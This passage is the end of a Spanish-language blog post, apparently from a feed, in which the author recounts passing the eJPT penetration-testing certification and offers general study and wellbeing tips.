
&lt;p&gt;Leer la carta de presentación es fundamental, al igual que las preguntas, ahí es donde se debe poner especial atención, debes trabajar para lograr ese resultado.&lt;/p&gt;

&lt;p&gt;Por otro lado, come bien, duerme bien, aléjate del PC de vez en cuando, respira, toma aire, sal a caminar un poco, eso oxigena la mente y te dará un nuevo aire para pensar mejor.&lt;/p&gt;

&lt;p&gt;Lo único que puedo decir es que es una buena certificación para iniciar (la primera que hago), personalmente me siento muy bien con el trabajo realizado, quería compartir un poco de esta experiencia para que se motiven a hacer la certificación si estas empezando y si ya eres alguien más experimentado, ¡nunca está de más tener un nuevo reto en la vida!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Pentesting" /><category term="eLearnSecurity" /><summary type="html">¡Hola! Vengo a contar mi experiencia de como logré adquirir el certificado de eLearnSecurity Junior Penetration Tester (eJPT)</summary></entry></feed>